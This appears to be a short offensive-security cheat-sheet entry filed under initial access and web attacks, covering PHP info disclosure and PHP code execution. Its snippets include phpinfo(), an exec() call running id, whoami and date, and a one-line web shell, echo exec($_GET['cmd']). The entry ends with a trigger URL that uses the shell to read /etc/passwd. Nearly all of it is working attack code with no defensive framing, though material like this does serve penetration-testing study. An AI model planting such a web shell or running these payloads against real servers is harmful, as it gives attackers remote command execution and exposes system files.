---
title: PHP Info Disclosure
category: initial-access
subcategory: web-attacks
os: linux
command: <?php phpinfo(); ?>
tools: php
---


### phpinfo() snippet

```php
<?php
phpinfo();
?>
```

### Settings worth checking after `phpinfo()`

- `disable_functions`
- `allow_url_fopen`
- `allow_url_include`

### Inline command execution snippet

```php
<?php
echo exec("id;whoami;date");
?>
```

### Parameterized RCE snippet

```php
<?php
echo exec($_GET['cmd']);
?>
```

Trigger with `....../test.php?cmd=cat /etc/passwd`.
